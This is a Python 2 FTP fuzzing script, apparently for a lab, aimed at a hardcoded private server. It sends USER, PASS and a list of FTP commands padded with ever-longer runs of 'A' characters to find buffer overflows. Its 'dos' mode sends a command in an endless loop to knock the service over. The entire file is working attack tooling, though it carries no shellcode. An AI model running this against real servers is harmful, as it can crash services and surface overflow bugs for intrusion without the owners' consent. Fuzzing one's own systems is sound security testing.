#!/usr/bin/python 

import socket
from time import sleep
from sys import argv 

HOST = '10.0.2.9'
PORT = 21 

commands = ["appe","port","nlst","acct","umask","delete","rename","get","put","mkd",
"cwd","abor","stor","size","dir","rmd","allo","pasv","retr","rest","list ","xmkd","dele",
"cdup", "cd","fget","lcd","lpage","mdelete","mget","mkdir","mput", "rmdir", "msend", 
"send","mlst", "page", "host", "accl"]

if len(argv) < 2:
        print "Usage: python2 ftp_fuzzer.py [login, cmd, overflow[command], dos[command]]"
        exit(0)

if argv[1] == "login":
    
    payload = "A"*100

    while len(payload) < 15000: 
        
        
        if argv[2] == "user":
          login = "USER " + payload + "\r\n"
        elif argv[2] == "pass":        
          login = "USER anonymous\r\n"
        

        password = "PASS "+payload+"\r\n"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((HOST, PORT))
        s.recv(2048)
 
        print "Sending payload. " + str(len(payload))
        
        s.send(login)
        print s.recv(1024)
        s.send(password)
        print s.recv(1024)
        s.close()
        payload += "A"*250
        sleep(1)

if argv[1] == "cmd": 
    
    payload = "A"*500

    while len(payload) < 15000: 

        for cmd in commands:
	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect = s.connect((HOST, PORT))
            s.recv(2048)
 
            s.send("USER anonymous\r\n")
            print s.recv(1024)
            s.send("PASS anonymous\r\n")
            print s.recv(1024)

	    command = cmd + " " + payload + "\r\n"
            print "Trying: "+cmd 

            print "Sending payload. " + str(len(payload))
            s.send(command) 
            #print s.recv(1024)
            sleep(0.05)
            s.close()

        payload += "A"*500

if argv[1] == "overflow":

    payload = "A"*500
    cmd = argv[2]

    while len(payload) < 15000:

      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      connect = s.connect((HOST, PORT))
      s.recv(2048)
 
      s.send("USER anonymous\r\n")
      print s.recv(1024)
      s.send("PASS anonymous\r\n")
      print s.recv(1024)

      command = cmd + " " + payload + "\r\n"
      print "Trying: "+cmd 

      print "Sending payload. " + str(len(payload))
      s.send(command) 
      #print s.recv(1024)
      sleep(1)
      s.close()

      payload += "A"*500


def crash(cmd): 

       payload = "A"*10

       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       connect = s.connect((HOST, PORT))
       print "Connected.."
       s.recv(2048)

       s.send("USER anonymous\r\n")
       print s.recv(1024)
       s.send("PASS anonymous\r\n")
       print s.recv(1024)
       
       command = cmd + " " + payload + "\r\n"

       while True:     
           print "Trying: "+cmd 
           print "Sending payload.\n"
           s.send(command) 
           #print s.recv(1024)

if argv[1] == "dos":

        crash(argv[2])




